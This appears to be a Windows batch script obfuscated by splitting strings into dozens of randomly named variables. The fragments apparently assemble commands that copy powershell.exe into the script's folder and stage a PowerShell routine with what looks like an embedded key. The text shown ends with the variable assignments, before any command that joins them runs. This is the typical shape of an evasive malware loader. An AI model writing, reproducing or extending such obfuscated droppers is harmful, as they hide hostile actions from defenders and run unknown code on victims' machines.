@echo off
set "UvebzTwHUE=we"
set "XSTcthDxiC=\v"
set "LilcuZklRv=Sy"
set "pAJmnbVGia=\W"
set "gjBBUgExKS=in"
set "llWulySnDp=he"
set "CPbGLnYWHO=co"
set "qCaetXYorP=py"
set "GxfydyPfyb=Po"
set "DPQywbioOa=:\"
set "GtmHGVTGfw=he"
set "fMOUjeqido=st"
set "YGrFxBixuE=xe"
set "KfjpOZgngg=Wi"
set "WzUHpAHKCi=rS"
set "YXcVTNdGUI=y "
set "ZPCxeHtKHb= /"
set "OYjGgvuLCv=rs"
set "YZYKwOEMzG=ll"
set "VXLHOOfwLA=do"
set "BTpGMXLFQO=.e"
set "AgEzYexwIH=ll"
set "KFBQYMUsBq=ws"
set "zByiAXAjkB=0\"
set "RFOblAMBIs=ow"
set "WUlWktrTbd=po"
set "CCTEgRwsiG= C"
set "eWaOrsOcyy=we"
set "lEEFHaVwzT=nd"
set "mEEOrBdnzj=em"
set "QfDqPSaGDT=1."
set "OKArfxsEPh=s\"
set "HrHsiItLGm=32"
set "xqKWNfSrlj=cd"
set "sMIRfFiDml= %~dp0"
set "hvufazsNEf=R5jf"
set "CxXuucfQQX=em.I"
set "cSFyNKSBJb=ach "
set "TMNtKIIaOW=, $h"
set "HJfVctqnuP=ewLi"
set "ugfsJsEOoB=trea"
set "bimGInzyYh=.Ass"
set "ChdmMxHTIZ=1..-"
set "Ruvxqamqxb=zm83"
set "IcAlVtfLAN=New-"
set "vtiwPkTkyl= [Sy"
set "GHPkddmkAB=ert]"
set "DmrIloJUWX=V = "
set "bSZGVYBJat=6esa"
